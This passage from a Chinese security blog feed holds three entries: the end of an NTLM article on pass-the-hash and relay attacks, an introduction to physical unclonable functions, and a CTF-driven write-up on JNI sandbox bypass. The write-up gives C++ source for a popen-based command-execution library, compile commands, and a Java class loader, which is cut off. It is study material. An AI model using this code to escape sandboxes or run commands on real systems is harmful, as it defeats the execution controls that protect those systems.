NTLM Hash 进行计算的，而不是用户密码进行计算的。因此在模拟用户登录或对访问资源的用户进行身份认证的时候，是不需要用户明文密码的，只需要用户 Hash。攻击者可以利用 NTLM Hash 直接远程登录目标主机或反弹 Shell。</font></p><p>在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也相同，攻击者就能使用哈希传递攻击的方法来登录内网中的其他主机。使用该方法，攻击者不需要花费时间来对Hash进行爆破，在内网渗透里非常经典。常常适用于域环境或工作组环境。</p><h2 id="4-2-利用-NTLM-进行内网信息收集"><a href="#4-2-利用-NTLM-进行内网信息收集" class="headerlink" title="4.2 利用 NTLM 进行内网信息收集"></a>4.2 利用 NTLM 进行内网信息收集</h2><p>在NTLM认证中 Type2 消息返回 Challenge 的过程中，同时返回了操作系统类型，主机名，NetBIOS 名称等。这也就意味着如果我们在能跟服务器进行 NTLM 交流中，给服务器发送一个 Type1 的请求，服务器返回 Type2 消息的响应，这一步，我们就可以得到很多信息。</p><h2 id="4-3-NTLM-Relay"><a href="#4-3-NTLM-Relay" class="headerlink" title="4.3 NTLM Relay"></a>4.3 NTLM Relay</h2><p>NTLM hash 分为 NTLMv1 NTLMv2 NTLM session v2 三种，NTLMv2 的强度比 NTLMv1 强了不少 ，我们在实战中，如果获得的是NTLMv1的话直接对其进行爆破就行了，而现实情况中我们遇到的是 NTLMv2，NTLMv2的密码强度高了不少，因此如果你没有一个超级强大的字典，你很难得到明文密码。那么，如果爆破行不通的话我们不妨试一下NTLM Relay攻击。</p><p>在这个NTLM Relay中，我们就是要将截获的Net-NTLM Hash重放来进行攻击，从而实现对其他机器的控制，所以严格意义上应该叫作Net-NTLM Relay。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.freebuf.com/articles/web/269876.html">https://www.freebuf.com/articles/web/269876.html</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>攻防渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows机制</tag>
      
      <tag>NTLM</tag>
      
      <tag>认证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>物理不可克隆函数PUF基础</title>
    <link href="/2024/11/30/%E7%89%A9%E7%90%86%E4%B8%8D%E5%8F%AF%E5%85%8B%E9%9A%86%E5%87%BD%E6%95%B0PUF%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/11/30/%E7%89%A9%E7%90%86%E4%B8%8D%E5%8F%AF%E5%85%8B%E9%9A%86%E5%87%BD%E6%95%B0PUF%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><h2 id="1-1-基础概念"><a href="#1-1-基础概念" class="headerlink" title="1.1 基础概念"></a>1.1 基础概念</h2><p><strong>PUF（Physical Unclonable Function，物理不可克隆函数）</strong>是一种<strong>硬件安全</strong>技术，利用硬件中固有的<strong>物理特性</strong>来生成<strong>唯一的</strong>、<strong>无法复制</strong>的数字指纹。这种技术常用于<strong>安全认证</strong>、<strong>密钥生成</strong>和<strong>加密硬件保护</strong>。</p><p>物理特性包括但不限于：微观制造工艺的随机性、电气特性差异、光学特性、磁学特性、机械特性、热学特性、随机噪声特性等等</p><h2 id="1-2-应用介绍"><a href="#1-2-应用介绍" class="headerlink" title="1.2 应用介绍"></a>1.2 应用介绍</h2><p>近期，中国移动旗下芯昇科技有限公司新推出一款高安全MCU芯片——CM32Sxx系列，通过使用南京帕孚信息科技有限公司SoftPUF开发工具包，在芯片中集成物理不可克隆功能（PUF），利用PUF技术提取出独一无二的“芯片指纹”，实现了芯片<strong>唯一身份标识</strong>和<strong>安全密钥</strong>生成等关键功能。这些特性赋予CM32Sxx系列芯片防克隆、防篡改、抗物理攻击以及侧信道攻击的能力，可为物联网场景下的终端设备提供高级别的安全保障。</p><p>CM32Sxx系列芯片选择使用SoftPUF进行PUF集成，相对于其他方案，它具有明显的优势：无需增加额外硬件，也无需修改原有芯片及设备的硬件设计。此外，SoftPUF可以在芯片的整个生命周期中灵活地进行集成，甚至可以部署到已安装在现网的设备上。因此，SoftPUF的推出使得PUF能够以低成本、灵活地集成到芯片和设备中，轻松获得可靠的信任基础。</p><h1 id="二、PUF-技术介绍"><a href="#二、PUF-技术介绍" class="headerlink" title="二、PUF 技术介绍"></a>二、PUF 技术介绍</h1><h2 id="2-1-PUF-的分类"><a href="#2-1-PUF-的分类" class="headerlink" title="2.1 PUF 的分类"></a>2.1 PUF 的分类</h2><p>根据实现方式，PUF 可分为多种类型：</p><ul><li>硅 PUF(silicon PUF)：基于半导体芯片工艺差异，例如 SRAM PUF、环振荡器（RO）PUF；</li><li>光学 PUF：利用光在材料中的散射特性生成唯一相应。</li><li>磁性 PUF：利用材料磁性差异；</li><li>纳米材料 PUF：利用纳米结构的随机分布特性；</li></ul><h2 id="2-2-PUF-的应用场景"><a href="#2-2-PUF-的应用场景" class="headerlink" title="2.2 PUF 的应用场景"></a>2.2 PUF 的应用场景</h2><h3 id="2-2-1-身份认证"><a href="#2-2-1-身份认证" class="headerlink" title="2.2.1 身份认证"></a>2.2.1 身份认证</h3><p>PUF可用来生成设备唯一的物理指纹，确保设备的身份真实可信。</p><ul><li>实现方法：</li></ul><p>通过<strong>挑战-响应对（Challenge-Response Pair, CRP）</strong>机制实现认证：<br>    1.设备生成PUF响应，并与预存的参考响应进行比对。<br>    2.如果匹配，则确认设备身份。<br>    •优点：<br>无需存储固定密钥，仅利用设备内部的PUF特性，防止身份伪造。</p><p>:::success<br><strong>挑战-响应对（****Challenge-Response Pair, CRP</strong>）工作原理：</p><ol><li>挑战（Challenge）：</li></ol><p>由认证方生成的随机输入，通常是一个比特串（字符串、数字等）。<br>2. 响应（Response）：<br>由被认证方（例如设备或芯片）根据PUF特性（物理不可克隆）或算法对挑战的计算或映射输出的结果。<br>3. 挑战响应对：<br>在设备制造或初始化时，预先收集并存储一组挑战和其对应的响应，用于后续身份验证。</p><p><strong>挑战-响应机制</strong>的流程：</p><ol><li>初始化阶段：</li></ol><ul><li>在设备连接时，认证中心向设备发送多个挑战$ C_i $；</li><li>设备根据 PUF 特性计算或映射出结果，返回多个挑战响应到认证中心；</li><li>认证中心通过数据库存储设备的挑战响应到安全服务器中；</li></ul><ol start="2"><li>认证阶段：</li></ol><ul><li>认证方随机选择一个挑战，发送给设备。</li><li>设备利用其内部PUF特性生成响应，并返回给认证方。</li><li>认证方将设备返回的响应与数据库中的参考响应进行比对。</li><li>如果匹配，则验证通过。</li></ul><p>:::</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202411301132345.png"></p><h3 id="2-2-2-动态密钥生成"><a href="#2-2-2-动态密钥生成" class="headerlink" title="2.2.2 动态密钥生成"></a>2.2.2 动态密钥生成</h3><p>PUF可以用于生成动态密钥，而不是存储静态密钥，减少被窃取的风险。</p><ul><li>实现方法</li></ul><ol><li>PUF通过特定挑战生成密钥材料。</li><li>使用纠错码（如Reed-Solomon码）和熵提取器提高密钥的一致性和随机性。</li></ol><h3 id="2-2-3-硬件根信任（Root-of-Trust）"><a href="#2-2-3-硬件根信任（Root-of-Trust）" class="headerlink" title="2.2.3 硬件根信任（Root of Trust）"></a>2.2.3 硬件根信任（Root of Trust）</h3><p>PUF可作为硬件信任链的基础，用于初始化安全功能和验证系统完整性。</p><ul><li>实现方法：</li></ul><ol><li>通过PUF生成唯一密钥，用于签署或验证固件。</li><li>在设备启动时验证硬件和固件的真实性。</li></ol><ul><li>优点：</li></ul><p>保证设备启动过程未被篡改。</p><h3 id="2-2-4-防克隆与伪造"><a href="#2-2-4-防克隆与伪造" class="headerlink" title="2.2.4 防克隆与伪造"></a>2.2.4 防克隆与伪造</h3><p>PUF提供了一种自然的防克隆机制，因为制造工艺随机性使得每个PUF响应都唯一。</p><ul><li>实现方法：</li></ul><ol><li>将PUF响应嵌入产品中，作为其唯一标识。</li><li>通过远程验证PUF的响应，确认设备真实性。</li></ol><ul><li>应用场景：</li></ul><p>用于防止IC芯片或其他硬件被仿冒。</p><h3 id="2-2-5-硬件加密模块保护"><a href="#2-2-5-硬件加密模块保护" class="headerlink" title="2.2.5 硬件加密模块保护"></a>2.2.5 硬件加密模块保护</h3><p>PUF可与硬件加密模块结合，用于保护加密密钥或签名私钥。</p><ul><li>实现方法：</li></ul><ol><li>动态生成密钥，并与特定硬件绑定。</li><li>即使设备被物理入侵，攻击者也无法直接读取加密密钥。</li></ol><ul><li>优点：</li></ul><p>提高硬件加密模块的抗篡改能力。</p><h3 id="2-2-6-防止回滚攻击"><a href="#2-2-6-防止回滚攻击" class="headerlink" title="2.2.6 防止回滚攻击"></a>2.2.6 防止回滚攻击</h3><p>通过PUF技术，可以记录设备的状态或固件版本，防止攻击者通过恢复旧版本固件来利用已修复的漏洞。</p><ul><li>实现方法：</li></ul><ol><li>在PUF生成的密钥基础上，绑定设备的固件版本或状态。</li><li>在系统启动时，通过验证确保固件为最新版本。</li></ol><h3 id="2-2-7-可信执行环境（TEE）中的应用"><a href="#2-2-7-可信执行环境（TEE）中的应用" class="headerlink" title="2.2.7 可信执行环境（TEE）中的应用"></a>2.2.7 可信执行环境（TEE）中的应用</h3><p>PUF技术可以增强TEE的安全性，确保运行环境无法被外部干扰或篡改。</p><ul><li>实现方法：</li></ul><ol><li>在TEE初始化时，利用PUF生成并保护密钥，用于加密和签名操作。</li><li>确保TEE的数据和代码完整性。</li></ol><h3 id="2-2-8-物联网（IoT）设备安全"><a href="#2-2-8-物联网（IoT）设备安全" class="headerlink" title="2.2.8 物联网（IoT）设备安全"></a>2.2.8 物联网（IoT）设备安全</h3><p>物联网设备通常受限于计算能力和存储空间，PUF技术为其提供了轻量级的安全方案。</p><ul><li>实现方法：</li></ul><ol><li>通过PUF生成唯一的设备身份，用于设备注册和认证。</li><li>在数据传输过程中利用PUF生成的密钥加密通信。</li></ol><h3 id="2-2-9-防止物理攻击"><a href="#2-2-9-防止物理攻击" class="headerlink" title="2.2.9 防止物理攻击"></a>2.2.9 防止物理攻击</h3><p>PUF可以有效防御以下物理攻击：</p><ul><li>侧信道攻击（Side-channel Attack）：PUF的随机性使其响应难以通过分析电磁泄漏或功耗推测。</li><li>硬件逆向工程：PUF特性是制造工艺的结果，难以通过复制或模仿获取相同的响应。</li></ul><h3 id="2-2-10-基于PUF的区块链安全"><a href="#2-2-10-基于PUF的区块链安全" class="headerlink" title="2.2.10 基于PUF的区块链安全"></a>2.2.10 基于PUF的区块链安全</h3><p>PUF生成的唯一标识可以用于确保区块链节点的真实性，防止伪造和篡改。</p><ul><li>实现方法：</li></ul><p>将PUF响应作为设备私钥的一部分，保证节点在网络中的唯一性。</p><h2 id="2-3-PUF-动态密钥生成"><a href="#2-3-PUF-动态密钥生成" class="headerlink" title="2.3 PUF 动态密钥生成"></a>2.3 PUF 动态密钥生成</h2><h3 id="2-3-1-基于挑战-响应对（CRP）的动态密钥生成"><a href="#2-3-1-基于挑战-响应对（CRP）的动态密钥生成" class="headerlink" title="2.3.1 基于挑战-响应对（CRP）的动态密钥生成"></a>2.3.1 <strong>基于挑战-响应对（CRP）的动态密钥生成</strong></h3><ul><li><strong>原理</strong>：<ul><li>PUF 接收一个输入（挑战），输出一个响应。</li><li>挑战可以是随机生成的，响应由 PUF 的物理特性唯一决定。</li></ul></li><li><strong>步骤</strong>：<ol><li>选择一个随机挑战 $ C $。</li><li>输入挑战 $ C $到 PUF，获得对应的响应 $ R $。</li><li>使用响应 $ R $ 直接作为密钥，或通过后续处理（如哈希函数）生成最终密钥。</li></ol></li><li><strong>特点</strong>：<ul><li>每次输入不同的挑战，生成的密钥都不同，动态性强。</li><li>挑战可以由通信双方协商或随机选定。</li></ul></li></ul><h3 id="2-3-2-基于-Helper-Data-的密钥生成"><a href="#2-3-2-基于-Helper-Data-的密钥生成" class="headerlink" title="2.3.2 基于 Helper Data 的密钥生成"></a>2.3.2 <strong>基于 Helper Data 的密钥生成</strong></h3><ul><li><strong>原理</strong>：<ul><li>PUF 输出通常会受到噪声影响，因此需要一个辅助数据结构（Helper Data）来稳定输出结果。</li><li>Helper Data 通过加密方式安全存储，但不会泄露密钥信息。</li></ul></li><li><strong>步骤</strong>：<ol><li><strong>注册阶段</strong>：<ul><li>提取 PUF 的稳定输出 $ R_{ref}<br>  $。</li><li>生成辅助数据 $ W $ 来帮助恢复 $ R_{ref}<br>  $，同时保证 $ W<br>$ 不泄露 $ R_{ref}<br>$。</li><li>$ W $ 被安全存储在设备中。</li></ul></li><li><strong>密钥恢复阶段</strong>：<ul><li>输入相同的挑战 $ C $ 到 PUF，得到有噪声的响应 $ R_{new} $</li><li>使用辅助数据 $ W $ 对 $ R_{new} $ 进行纠错，恢复原始的 $ R_{ref}<br>  $。</li><li>$ R_{ref}<br>  $ 作为密钥或密钥种子。</li></ul></li></ol></li><li><strong>特点</strong>：<ul><li>提高了 PUF 输出的可靠性。</li><li>适用于受环境噪声影响较大的 PUF。</li></ul></li></ul><h3 id="2-3-3-基于模糊提取器（Fuzzy-Extractor）的密钥生成"><a href="#2-3-3-基于模糊提取器（Fuzzy-Extractor）的密钥生成" class="headerlink" title="2.3.3 基于模糊提取器（Fuzzy Extractor）的密钥生成"></a>2.3.3 <strong>基于模糊提取器（Fuzzy Extractor）的密钥生成</strong></h3><ul><li><strong>原理</strong>：<ul><li>模糊提取器是一种密码学工具，用于从模糊的生物特征或 PUF 输出中生成稳定、随机的密钥。</li></ul></li><li><strong>步骤</strong>：<ol><li><strong>注册阶段</strong>：<ul><li>PUF 输出 $ R_{ref}<br>  $ 被分成两个部分：密钥 $ K<br>$ 和辅助数据 $ K<br>$。</li><li>$ P<br>  $ 是公开的，但不泄露 $ K<br>$ 的信息。</li></ul></li><li><strong>密钥恢复阶段</strong>：<ul><li>使用新的 PUF 输出 $ R_{new}<br>  $ 和 $ P $来纠正错误，恢复原始密钥 $ K<br>$。</li></ul></li></ol></li><li><strong>特点</strong>：<ul><li>确保密钥的高随机性和稳定性。</li><li>对噪声有很强的容忍度。</li></ul></li></ul><h3 id="2-3-4-基于随机数种子的动态密钥生成"><a href="#2-3-4-基于随机数种子的动态密钥生成" class="headerlink" title="2.3.4 基于随机数种子的动态密钥生成"></a>2.3.4 <strong>基于随机数种子的动态密钥生成</strong></h3><ul><li><strong>原理</strong>：<ul><li>PUF 输出用于生成随机数种子，后续通过伪随机数生成器（PRNG）扩展为动态密钥。</li></ul></li><li><strong>步骤</strong>：<ol><li>提取 PUF 输出 $ R $。</li><li>使用 $ R $ 作为种子输入到 PRNG。</li><li>PRNG 生成所需长度的密钥 $ R $。</li></ol></li><li><strong>特点</strong>：<ul><li>通过 PRNG 提供额外的随机性。</li><li>动态密钥长度可控。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>科研工作</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PUF</tag>
      
      <tag>物理不可克隆函数</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNI（Java Native Interface）攻击</title>
    <link href="/2024/11/23/JNI%EF%BC%88Java-Native-Interface%EF%BC%89%E6%94%BB%E5%87%BB/"/>
    <url>/2024/11/23/JNI%EF%BC%88Java-Native-Interface%EF%BC%89%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h2 id="1-1-学习目的"><a href="#1-1-学习目的" class="headerlink" title="1.1 学习目的"></a>1.1 学习目的</h2><p>比赛遇到了，确实不会，也觉得应该不是考这玩意儿的吧，实在太老了这玩意儿，19年还是18年的玩意儿了，没想到真是，晕了~~~</p><p>比赛场景，Java代码执行，可以在main函数中填写内容执行，不得导入新的包（可以用全类名），存在沙箱jvm-sandbox，也就是alibaba旗下的那个沙箱，过滤了命令执行的三种基础方式；</p><p>简单学习学习吧，其实也是一个蛮有意思的玩意儿的，但是就是不知道后续还能不能利用，除了比赛以外。</p><h2 id="1-2-JNI介绍"><a href="#1-2-JNI介绍" class="headerlink" title="1.2 JNI介绍"></a>1.2 JNI介绍</h2><p>Java语言是基于C语言实现的，Java底层的很多API都是通过<code>JNI(Java Native Interface)</code>来实现的。通过<code>JNI</code>接口<code>C/C++</code>和<code>Java</code>可以互相调用(存在跨平台问题)。Java可以通过JNI调用来弥补语言自身的不足(代码安全性、内存操作等)。</p><p><code>JNI</code>是一种比较特殊的方式，如果能够利用效果等同于绕过Java 命令执行API。</p><h1 id="二、利用实践"><a href="#二、利用实践" class="headerlink" title="二、利用实践"></a>二、利用实践</h1><h2 id="2-1-利用条件"><a href="#2-1-利用条件" class="headerlink" title="2.1 利用条件"></a>2.1 利用条件</h2><h3 id="注意与环境版本匹配"><a href="#注意与环境版本匹配" class="headerlink" title="注意与环境版本匹配"></a>注意与环境版本匹配</h3><p>在利用的过程中我们需要关注的点有</p><ol><li><p>jdk版本</p></li><li><p>gcc版本</p></li><li><p>jdk是否支持反射（–add-opens）</p></li><li><p>是否存在相关类的过滤</p></li><li><p>操作系统</p></li></ol><p>在实际利用的环境中，我们需要考虑以上的点，存在不匹配即可能是利用失败的原因；当然，如果全都匹配了，但依然利用失败，那也是有可能的。</p><h3 id="本文环境"><a href="#本文环境" class="headerlink" title="本文环境"></a>本文环境</h3><p>本文实践环境为：</p><ol><li><p>jdk17.0.2</p></li><li><p>gcc version 11.4.0 (Ubuntu 11.4.0-1ubuntu1~22.04)</p></li></ol><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li><p>存在文件上传</p></li><li><p>存在Java代码执行</p></li><li><p>代码执行过滤不完善</p></li></ol><h2 id="2-2-动态库编译"><a href="#2-2-动态库编译" class="headerlink" title="2.2 动态库编译"></a>2.2 动态库编译</h2><p>首先我们编写动态库代码，保存到文件<code>libcmd.cpp</code>，然后利用命令编译成动态库；</p><ul><li><strong>com_anbai_sec_cmd_CommandExecution.h</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jni.h&gt;</span></span><br><span class="hljs-comment">/* Header for class com_anbai_sec_cmd_CommandExecution */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _Included_com_anbai_sec_cmd_CommandExecution</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _Included_com_anbai_sec_cmd_CommandExecution</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Class:     com_anbai_sec_cmd_CommandExecution</span><br><span class="hljs-comment"> * Method:    exec</span><br><span class="hljs-comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_com_anbai_sec_cmd_CommandExecution_exec</span></span><br><span class="hljs-function">  <span class="hljs-params">(JNIEnv *, jclass, jstring)</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><ul><li><strong>libcmd.cpp</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;com_anbai_sec_cmd_CommandExecution.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function">JNIEXPORT jstring</span><br><span class="hljs-function"></span><br><span class="hljs-function">JNICALL <span class="hljs-title">Java_com_anbai_sec_cmd_CommandExecution_exec</span></span><br><span class="hljs-function">        <span class="hljs-params">(JNIEnv *env, jclass jclass, jstring str)</span> </span>&#123;<br><br>    <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">NULL</span>) &#123;<br>        jboolean jsCopy;<br>        <span class="hljs-comment">// 将jstring参数转成char指针</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd = env-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(str, &amp;jsCopy);<br>        <span class="hljs-comment">// 使用popen函数执行系统命令</span><br>        FILE *fd  = <span class="hljs-built_in">popen</span>(cmd, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-keyword">if</span> (fd != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// 返回结果字符串</span><br>            string result;<br>            <span class="hljs-comment">// 定义字符串数组</span><br>            <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];<br>            <span class="hljs-comment">// 读取popen函数的执行结果</span><br>            <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fgets</span>(buf, <span class="hljs-built_in">sizeof</span>(buf), fd) != <span class="hljs-literal">NULL</span>) &#123;<br>                <span class="hljs-comment">// 拼接读取到的结果到result</span><br>                result +=buf;<br>            &#125;<br>            <span class="hljs-comment">// 关闭popen</span><br>            <span class="hljs-built_in">pclose</span>(fd);<br>            <span class="hljs-comment">// 返回命令执行结果给Java</span><br>            <span class="hljs-keyword">return</span> env-&gt;<span class="hljs-built_in">NewStringUTF</span>(result.<span class="hljs-built_in">c_str</span>());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>Windows编译</strong></li></ul><ol><li><p><code>Visual Studio/cl命令</code>编译dll。</p></li><li><p>使用<code>min-gw/cygwin</code>安装<code>gcc/g++</code>，如:</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">x86_64-w64-mingw32-g++ -I<span class="hljs-string">&quot;%JAVA_HOME%\include&quot;</span> -I<span class="hljs-string">&quot;%JAVA_HOME%\include\win32&quot;</span> -shared -o cmd.dll libcmd.cpp<br></code></pre></td></tr></table></figure><ul><li><strong>Linux编译</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">g++ -fPIC -I<span class="hljs-string">&quot;<span class="hljs-variable">$JAVA_HOME</span>/include&quot;</span> -I<span class="hljs-string">&quot;<span class="hljs-variable">$JAVA_HOME</span>/include/linux&quot;</span> -shared -o libcmd.so libcmd.cpp<br></code></pre></td></tr></table></figure><ul><li><strong>MacOS编译</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">g++ -fPIC -I<span class="hljs-string">&quot;<span class="hljs-variable">$JAVA_HOME</span>/include&quot;</span> -I<span class="hljs-string">&quot;<span class="hljs-variable">$JAVA_HOME</span>/include/darwin&quot;</span> -shared -o libcmd.jnilib libcmd.cpp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410201804054.png" alt="null"></p><h2 id="2-3-调用动态库执行命令"><a href="#2-3-调用动态库执行命令" class="headerlink" title="2.3 调用动态库执行命令"></a>2.3 调用动态库执行命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 注意--add-opens选项的设置，高版本jdk禁用反射的时候需要设置</span><br>java --add-opens java.base/java.lang=ALL-UNNAMED loadso.java<br>public class loadso &#123;<br>    public static void main(String[] args) &#123;<br>        System.out.println(<span class="hljs-string">&quot;START&quot;</span>);<br><br>        String COMMAND_CLASS_NAME = <span class="hljs-string">&quot;com.anbai.sec.cmd.CommandExecution&quot;</span>;<br>        byte[] COMMAND_CLASS_BYTES = new byte[]&#123;<br>            -54, -2, -70, -66, 0, 0, 0, 49, 0, 15, 10, 0, 3, 0, 12, 7, 0, 13, 7, 0, 14, 1,<br>            0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,<br>            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108,<br>            101, 1, 0, 4, 101, 120, 101, 99, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97,<br>            110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108,<br>            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114,<br>            99, 101, 70, 105, 108, 101, 1, 0, 21, 67, 111, 109, 109, 97, 110, 100, 69, 120,<br>            101, 99, 117, 116, 105, 111, 110, 46, 106, 97, 118, 97, 12, 0, 4, 0, 5, 1, 0, 34,<br>            99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 109, 100, 47, 67,<br>            111, 109, 109, 97, 110, 100, 69, 120, 101, 99, 117, 116, 105, 111, 110, 1, 0, 16,<br>            106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0,<br>            2, 0, 3, 0, 0, 0, 0, 0, 2, 0, 1, 0, 4, 0, 5, 0, 1, 0, 6, 0, 0, 0, 29, 0, 1, 0, 1,<br>            0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 7, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 1,<br>            9, 0, 8, 0, 9, 0, 0, 0, 1, 0, 10, 0, 0, 0, 2, 0, 11<br>        &#125;;<br>        String cmd = <span class="hljs-string">&quot;ls&quot;</span>;<br><br>        try &#123;<br>            ClassLoader loader = new ClassLoader(ClassLoader.getSystemClassLoader()) &#123;<br>                @Override<br>                protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;<br>                    try &#123;<br>                        <span class="hljs-built_in">return</span> super.findClass(name);<br>                    &#125; catch (ClassNotFoundException e) &#123;<br>                        <span class="hljs-built_in">return</span> defineClass(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, 0, COMMAND_CLASS_BYTES.length);<br>                    &#125;<br>                &#125;<br>            &#125;;<br><br>            // 测试时候换成自己编译好的lib路径<br>            java.io.File libPath = new java.io.File(<span 